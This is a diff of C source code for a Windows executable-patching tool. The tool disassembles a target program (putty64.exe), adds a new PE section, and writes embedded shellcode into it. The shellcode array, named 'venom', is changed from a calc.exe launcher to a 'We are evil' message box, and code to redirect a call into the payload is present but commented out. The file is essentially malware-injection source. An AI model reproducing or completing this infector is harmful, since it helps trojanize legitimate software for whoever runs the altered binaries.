@@ -20,32 +20,25 @@ void get_all_info_from_exe(const char* exe_filename,
         ExeInfo** out_exe_info, 
         AsmParserState** out_asm_state,
         JumpTable** out_jump_table) {
-    char* binary_filename = malloc(strlen(exe_filename) - strlen(".exe") + strlen("_binary.bin") + 1);
     char* objdump_complete_filename = malloc(strlen(exe_filename) - strlen(".exe") + strlen("_objdump_complete.asm") + 1);
 
-    memcpy(binary_filename, exe_filename, strlen(exe_filename) - strlen(".exe"));
     memcpy(objdump_complete_filename, exe_filename, strlen(exe_filename) - strlen(".exe"));
-    memcpy(binary_filename + strlen(exe_filename) - strlen(".exe"), "_binary.bin", strlen("_binary.bin") + 1);
     memcpy(objdump_complete_filename + strlen(exe_filename) - strlen(".exe"), "_objdump_complete.asm", strlen("_objdump_complete.asm") + 1);
 
-    printf("new bin: %s\n", binary_filename);
     printf("new objdump: %s\n", objdump_complete_filename);
 
     ExeInfo* exe_info = exe_get_info(exe_filename);
-    
-    FILE* bin_fd = fopen(binary_filename, "w");
-    fwrite(exe_info->raw_text_code, exe_info->text_section->SizeOfRawData, 1, bin_fd);
-    fclose(bin_fd);
-    
+
     // objdump -b binary -m i386:x86-64 -D temp.bin > something.asm
     char* objdump_command_str = malloc(sizeof(char) * 512);
     snprintf(objdump_command_str, 512, "objdump -j .text -m i386:x86-64 -D %s > %s", exe_filename, objdump_complete_filename); // TODO(TeYo): filanames are not allowed to contain spaces
     system(objdump_command_str);
 
-    AsmParserState* asm_state = build_asm_parser_state(binary_filename, max_instruction_count, exe_info->raw_text_file_offset);
+    printf("TESTING\n");
+    AsmParserState* asm_state = build_asm_parser_state(exe_info->raw_text_code, exe_info->text_section->SizeOfRawData, max_instruction_count);
     parse_asm(asm_state);
-
-    JumpTable* jump_table = parse_jump_table(exe_info, asm_state, max_jump_function_count);
+    
+    JumpTable* jump_table = build_jump_table(exe_info, max_jump_function_count);
 
     if (out_exe_info != NULL) {
         *out_exe_info = exe_info;
@@ -148,6 +141,7 @@ unsigned int find_printf_call(AsmParserState* asm_state, JumpFunction* printf_ju
     return 0;
 }
 
+/*
 void find_all_calls_to(AsmParserState* asm_state, JumpTable* jump_table, const char* func_name) {
     JumpFunction* jump_func = find_jump_func(jump_table, func_name);
     if (jump_func == NULL) {
@@ -172,6 +166,7 @@ void find_all_calls_to(AsmParserState* asm_state, JumpTable* jump_table, const c
         }
     }
 }
+*/
 
 void zero_init(char* data, unsigned int size) {
     for (unsigned int i = 0; i < size; i++) {
@@ -300,8 +295,6 @@ int test_new_section() {
 
     print_jump_table(jump_table);
 
-    find_all_calls_to(asm_state, jump_table, "fputs");
-
     FILE* fd = fopen(EXECUTABLE_FILENAME, "r");   
 
     char* data = malloc(exe_info->file_size);
@@ -375,37 +368,42 @@ int test_new_section() {
     return 0;
 }
 
+// TODO(TeYo): code up an absolute_jmp builder, then finish this project up [:
+
 int main() {
 unsigned char venom[] = 
-"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
-"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
-"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
-"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
-"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
-"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
-"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
-"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
-"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
-"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
-"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
-"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
-"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
-"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
-"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
-"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
-"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
-"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
-"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
-"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
+"\x8d\x8d\x25\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
+"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
+"\x00\x3e\x4c\x8d\x85\x1a\x01\x00\x00\x48\x31\xc9\x41\xba"
+"\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
+"\x56\xff\xd5\x57\x65\x20\x61\x72\x65\x20\x65\x76\x69\x6c"
+"\x00\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00\x75\x73"
+"\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";
     unsigned int VENOM_SIZE = sizeof(venom) / sizeof(unsigned char);
 
     ExeInfo* exe_info;
     AsmParserState* asm_state;
     JumpTable* jump_table;
-    const unsigned int MAX_INSTRUCTION_COUNT = 4096 * 4;
-    const unsigned int MAX_JUMP_FUNCTION_COUNT = 128;
+    const unsigned int MAX_INSTRUCTION_COUNT = 4096 * 128;
+    const unsigned int MAX_JUMP_FUNCTION_COUNT = 4096;
     const unsigned int NEW_SECTION_RAW_DATA_SIZE = 0x1000;
-    const char* EXECUTABLE_FILENAME = "test/simple64.exe";
+    const char* EXECUTABLE_FILENAME = "test/putty64.exe";
     const char* MODIFIED_EXECUTABLE_FILENAME = "test/modified64.exe";
 
     get_all_info_from_exe(
@@ -416,13 +414,10 @@ unsigned char venom[] =
             &asm_state,
             &jump_table);
 
-    print_jump_table(jump_table);
+    jump_table_find_references(exe_info, asm_state, jump_table);
 
-    find_all_calls_to(asm_state, jump_table, "fprintf");
-    find_all_calls_to(asm_state, jump_table, "fputs");
-    find_all_calls_to(asm_state, jump_table, "fwrite");
-    find_all_calls_to(asm_state, jump_table, "exit");
-    
+    exit(0);
+    //print_jump_table(jump_table);
 
     FILE* fd = fopen(EXECUTABLE_FILENAME, "r");   
 
@@ -449,6 +444,7 @@ unsigned char venom[] =
 
     // put venom in payload
     {
+        printf("VENOM SIZE: %u\n", VENOM_SIZE);
         memcpy(payload_buffer, venom, VENOM_SIZE);
     }
 
@@ -464,6 +460,7 @@ unsigned char venom[] =
     }
     */
 
+    /*
     // change call to jump instruction
     {
         unsigned int ptr = asm_state->binary_instruction_pointers[1740];
@@ -472,6 +469,7 @@ unsigned char venom[] =
                 new_header->VirtualAddress);
         add_instruction(mod_table, jmp_info);
     }
+    */
 
     section_push_back(exe_info, mod_table, &new_section, new_header);
 
@@ -482,8 +480,6 @@ unsigned char venom[] =
     fclose(fd);
     unsigned int new_file_size = get_file_size(MODIFIED_EXECUTABLE_FILENAME);
     fd = fopen(MODIFIED_EXECUTABLE_FILENAME, "r");
-
-
     char* new_data = malloc(new_file_size);
     read_file(fd, new_file_size, &new_data);
     clear_mod_table(mod_table, new_data, new_file_size);
@@ -492,6 +488,7 @@ unsigned char venom[] =
     fd = fopen(MODIFIED_EXECUTABLE_FILENAME, "w");
     use_mod_table(mod_table, fd);
     fclose(fd);
+    
     char* objdump_command_str = malloc(sizeof(char) * 512);
     snprintf(objdump_command_str, 512, "objdump -j .text -m i386:x86-64 -D %s > %s",
             MODIFIED_EXECUTABLE_FILENAME, "test/modified64_objdump_complete.asm");
